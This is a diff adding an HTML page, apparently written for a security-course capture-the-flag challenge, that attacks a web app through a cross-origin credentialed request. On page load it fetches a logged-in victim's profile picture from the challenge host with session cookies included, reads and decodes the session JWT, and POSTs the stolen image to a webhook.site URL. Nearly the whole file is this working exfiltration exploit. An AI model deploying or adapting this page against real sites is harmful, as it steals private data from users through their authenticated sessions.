@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Load Profile Picture from p1 and Send to Webhook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 20px;
+        }
+        .error {
+            color: red;
+            margin-top: 20px;
+        }
+        .info {
+            color: blue;
+            margin-top: 20px;
+        }
+        .success {
+            color: green;
+            margin-top: 20px;
+        }
+        button {
+            padding: 10px 20px;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Profile Picture from p1</h1>
+    <p>Attempting to load the profile picture from p1 using two methods: an img tag and a fetch request. If successful, the image will be sent to webhook.site via POST.</p>
+
+    <!-- Method 1: Using <img> tag to load the image directly -->
+    <h2>Method 1: Using &lt;img&gt; tag</h2>
+    <p>This uses a simple img tag to load the image. The browser automatically sends the session cookie if available.</p>
+    <img src="https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/profile-pic" alt="User profile picture from p1" id="profile-pic-img">
+
+    <!-- Method 2: Using fetch to load the image -->
+    <h2>Method 2: Using fetch</h2>
+    <p>This uses JavaScript fetch to load the image as a Blob and display it. It explicitly includes credentials to send the session cookie.</p>
+    <div id="fetch-result"></div>
+
+    <!-- Debug: Show current cookies for p1 -->
+    <h2>Debug: Current Cookies</h2>
+    <p>Below is the current session cookie for p1 (if available). A valid cookie should have a 'user_id' in the payload.</p>
+    <pre id="cookie-info">Checking cookies...</pre>
+
+    <!-- Button to open login page -->
+    <h2>Login to p1</h2>
+    <p>If the image doesn't load, you may need to log in to p1 to generate a valid session cookie with a user_id.</p>
+    <button onclick="window.open('https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/login', '_blank')">Log in to p1</button>
+
+    <script>
+        // Webhook URL
+        const WEBHOOK_URL = 'https://webhook.site/7c2f9e76-5d32-4f1c-b61e-8de3af76eb97';
+
+        // Function to decode JWT payload
+        function decodeJWTPayload(jwt) {
+            try {
+                const payload = jwt.split('.')[1];
+                return JSON.parse(atob(payload));
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // Function to check and display cookies for p1
+        function checkCookies() {
+            const cookieInfo = document.getElementById('cookie-info');
+            const cookies = document.cookie.split(';').map(cookie => cookie.trim());
+            const sessionCookie = cookies.find(cookie => cookie.startsWith('session='));
+            if (sessionCookie) {
+                const jwt = sessionCookie.split('=')[1];
+                const payload = decodeJWTPayload(jwt);
+                if (payload) {
+                    cookieInfo.textContent = `Session Cookie: ${jwt}\nPayload: ${JSON.stringify(payload, null, 2)}`;
+                    if (payload._flashes) {
+                        cookieInfo.innerHTML += '<p class="error">Error: The cookie contains a login error message. Please log in to p1 to get a valid session cookie with user_id.</p>';
+                    } else if (payload.user_id) {
+                        cookieInfo.innerHTML += '<p class="info">Valid session cookie detected with user_id.</p>';
+                    }
+                } else {
+                    cookieInfo.textContent = 'Invalid session cookie format.';
+                }
+            } else {
+                cookieInfo.textContent = 'No session cookie found for p1. Please log in to p1.';
+            }
+        }
+
+        // Function to send image to webhook
+        async function sendToWebhook(blob, filename = 'profile-pic.png') {
+            try {
+                const formData = new FormData();
+                formData.append('file', blob, filename); // Adjunta la imagen como archivo
+
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'X-From': 'p2-profile-loader' // Header opcional para identificar la solicitud
+                    }
+                });
+
+                if (response.ok) {
+                    console.log('Imagen enviada exitosamente al webhook');
+                    return true;
+                } else {
+                    console.error('Error al enviar al webhook:', response.status);
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error al enviar al webhook:', error);
+                return false;
+            }
+        }
+
+        // Function to load the image using fetch
+        async function loadProfilePicture() {
+            const fetchResult = document.getElementById('fetch-result');
+            try {
+                const response = await fetch('https://chl-60d5b8fe-ad2b-4192-b170-f20940af90ab-imagen-importante.softwareseguro.com.ar/profile-pic', {
+                    method: 'GET',
+                    credentials: 'include', // Send session cookies
+                    mode: 'cors' // Use CORS mode to allow reading the response
+                });
+
+                if (!response.ok) {
+                    if (response.status === 302) {
+                        fetchResult.innerHTML = '<p class="error">Error: Redirected to login. The session cookie is invalid or missing. Please log in to p1 using the button below.</p>';
+                    } else {
+                        fetchResult.innerHTML = `<p class="error">Error: Failed to load image (Status: ${response.status}).</p>`;
+                    }
+                    return;
+                }
+
+                // Convert response to Blob for image handling
+                const blob = await response.blob();
+                const imgUrl = URL.createObjectURL(blob);
+                
+                // Create and append the image
+                const img = document.createElement('img');
+                img.src = imgUrl;
+                img.alt = 'User profile picture loaded via fetch from p1';
+                fetchResult.appendChild(img);
+
+                // Send the image to webhook.site
+                const sent = await sendToWebhook(blob, 'profile-pic-from-p1.png');
+                if (sent) {
+                    fetchResult.innerHTML += '<p class="success">Image loaded successfully via fetch and sent to webhook.site!</p>';
+                } else {
+                    fetchResult.innerHTML += '<p class="error">Image loaded but failed to send to webhook.site.</p>';
+                }
+
+                fetchResult.innerHTML += '<p class="info">Image loaded successfully via fetch.</p>';
+            } catch (error) {
+                fetchResult.innerHTML = `<p class="error">Error: ${error.message}. Check if the server is reachable, CORS is properly configured, or the session cookie is valid.</p>`;
+            }
+        }
+
+        // Run functions when the page loads
+        window.onload = () => {
+            checkCookies();
+            loadProfilePicture();
+        };
+    </script>
+</body>
+</html>
